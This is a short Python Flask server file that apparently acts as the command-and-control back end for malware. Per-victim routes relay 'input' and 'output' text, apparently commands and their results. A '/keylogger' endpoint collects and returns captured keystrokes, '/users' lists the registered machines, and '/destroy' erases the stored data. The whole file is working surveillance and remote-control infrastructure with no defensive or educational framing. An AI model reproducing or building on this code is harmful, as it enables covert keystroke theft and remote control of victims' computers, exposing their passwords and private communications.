from app import server
from app.model.database import Database
from flask import request


database = Database()


@server.route("/<user>/input", methods = ["GET", "POST"])
def input(user):

    if not user in database: database.createUser(user)

    if request.json: database.setInput(user, request.json.get("text", ""))

    return database.getInput(user) if request.method.upper() == "GET" else ""


@server.route("/<user>/output", methods = ["GET", "POST"])
def output(user):

    if not user in database: database.createUser(user)

    if request.json: database.setOutput(user, request.json.get("text", ""))

    return database.getOutput(user) if request.method.upper() == "GET" else ""


@server.route("/<user>/keylogger", methods = ["GET", "POST"])
def keylogger(user):

    if not user in database: database.createUser(user)
        
    if request.json: database.addKey(user, request.json.get("text", ""))

    return "".join(database.getKeys(user))


@server.route("/users", methods = ["GET", ])
def menu():
    
    return str(database.users)


@server.route("/destroy", methods = ["POST", ])
def destroy():

    if request.json and request.json.get("text", "False") == "True":
        database.destroy()  
    return ""

